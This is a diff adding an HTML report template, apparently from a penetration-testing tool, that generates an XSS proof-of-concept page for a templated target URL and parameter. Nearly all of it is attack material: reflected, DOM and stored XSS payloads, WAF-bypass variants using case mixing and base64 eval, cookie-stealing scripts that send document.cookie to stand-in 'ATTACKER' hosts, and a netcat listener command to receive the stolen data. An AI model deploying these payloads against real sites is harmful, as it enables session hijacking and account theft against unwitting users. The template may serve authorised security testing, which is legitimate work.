@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS POC - {{ vuln_type }}</title>
+    <meta charset="UTF-8">
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #e94560; padding: 20px; }
+        .poc-box { background: #16213e; padding: 15px; border-radius: 8px; margin: 10px 0; }
+        .payload { color: #0f3460; background: #e94560; padding: 2px 8px; border-radius: 4px; }
+        h2 { color: #e94560; }
+    </style>
+</head>
+<body>
+    <h2>XSS POC - {{ vuln_type }}</h2>
+
+    <div class="poc-box">
+        <h3>目标信息</h3>
+        <p><strong>URL:</strong> {{ target_url }}</p>
+        <p><strong>参数:</strong> {{ parameter }}</p>
+        <p><strong>方法:</strong> {{ method }}</p>
+    </div>
+
+    <div class="poc-box">
+        <h3>Payload 列表</h3>
+        <table border="1" style="border-collapse: collapse; width: 100%;">
+            <tr style="background: #e94560; color: #fff;">
+                <th>类型</th>
+                <th>Payload</th>
+                <th>说明</th>
+            </tr>
+            <tr>
+                <td>反射型</td>
+                <td class="payload">&lt;script&gt;alert('XSS')&lt;/script&gt;</td>
+                <td>基础弹窗测试</td>
+            </tr>
+            <tr>
+                <td>反射型</td>
+                <td class="payload">&lt;img src=x onerror=alert('XSS')&gt;</td>
+                <td>IMG 标签触发</td>
+            </tr>
+            <tr>
+                <td>反射型</td>
+                <td class="payload">&lt;svg onload=alert('XSS')&gt;</td>
+                <td>SVG 标签触发</td>
+            </tr>
+            <tr>
+                <td>反射型</td>
+                <td class="payload">&lt;script&gt;document.location='http://ATTACKER/cookie?c='+document.cookie&lt;/script&gt;</td>
+                <td>Cookie 窃取</td>
+            </tr>
+            <tr>
+                <td>DOM 型</td>
+                <td class="payload">#&lt;img src=x onerror=alert('XSS')&gt;</td>
+                <td>DOM 注入</td>
+            </tr>
+            <tr>
+                <td>存储型</td>
+                <td class="payload">&lt;script&gt;fetch('http://ATTACKER/keylog',{method:'POST',body:document.cookie})&lt;/script&gt;</td>
+                <td>持久化 Cookie 窃取</td>
+            </tr>
+            <tr>
+                <td>WAF 绕过</td>
+                <td class="payload">&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;</td>
+                <td>大小写混淆</td>
+            </tr>
+            <tr>
+                <td>WAF 绕过</td>
+                <td class="payload">&lt;script&gt;eval(atob('YWxlcnQoJ1hTUycp'))&lt;/script&gt;</td>
+                <td>Base64 编码</td>
+            </tr>
+        </table>
+    </div>
+
+    <div class="poc-box">
+        <h3>自动验证</h3>
+        <p>点击以下链接测试漏洞：</p>
+        <p><a href="{{ target_url }}?{{ parameter }}=<script>alert('XSS')</script>" target="_blank">测试基础 XSS</a></p>
+        <p><a href="{{ target_url }}?{{ parameter }}=<img src=x onerror=alert('XSS')>" target="_blank">测试 IMG XSS</a></p>
+    </div>
+
+    <div class="poc-box">
+        <h3>Cookie 窃取 POC</h3>
+        <p>需要设置接收服务器：</p>
+        <pre>
+# 监听服务器
+python3 -m http.server 8888
+
+# 或使用 netcat
+nc -lvnp 8888
+        </pre>
+        <p>Payload：</p>
+        <pre>
+&lt;script&gt;
+  new Image().src = 'http://ATTACKER_IP:8888/steal?cookie=' + encodeURIComponent(document.cookie);
+&lt;/script&gt;
+        </pre>
+    </div>
+
+    <div class="poc-box">
+        <h3>证据</h3>
+        <pre>{{ evidence }}</pre>
+    </div>
+</body>
+</html>
